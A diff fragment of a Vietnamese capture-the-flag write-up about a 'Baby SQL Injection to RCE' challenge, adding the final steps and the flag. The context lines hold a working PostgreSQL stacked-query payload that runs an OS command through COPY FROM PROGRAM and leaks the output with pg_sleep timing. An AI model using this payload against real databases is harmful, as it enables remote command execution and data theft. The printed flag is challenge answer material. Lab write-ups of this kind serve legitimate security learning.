@@ -128,3 +128,8 @@ và đây là payload của mình :
 **"test';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'ls / -m';select case when substring(cmd_output,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from cmd_exec limit 1;DROP TABLE IF EXISTS cmd_exec;--"**
 
 Tiếp theo mình sẽ viết script python để tìm ra tên thư mục chứa flag ở đâu link_script mình để đây cho những ai cần tham khảo https://github.com/tthanhnguyen/CTF_cookie-Arena/blob/main/Baby_SQL_Injection%20_to_RCE.py
+chạy script mình sẽ tìm ra được file chứa flag là "flagqInZr.txt" sau đó ta chỉ cần sửa lại script để cat /flagqInZr.txt là xong
+
+![image](https://github.com/user-attachments/assets/a0b66110-1249-4997-ad39-77b0d41782e0)
+
+**FLAG : CHH{5QLI_rCe_U5iN6_St4cK_Qu3RY_78647d29c57d883d837c9c925519b417}**
